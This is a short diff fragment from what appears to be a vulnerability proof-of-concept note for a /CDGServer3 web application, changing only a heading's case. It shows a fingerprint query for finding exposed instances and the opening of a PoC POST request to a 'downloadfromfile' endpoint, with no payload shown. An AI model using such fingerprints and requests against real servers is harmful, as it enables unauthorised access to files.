@@ -4,7 +4,7 @@
 ```
 body="/CDGServer3/index.jsp"
 ```
-## poc
+## POC
 ```
 POST /CDGServer3/downloadfromfile HTTP/1.1
 Host: 
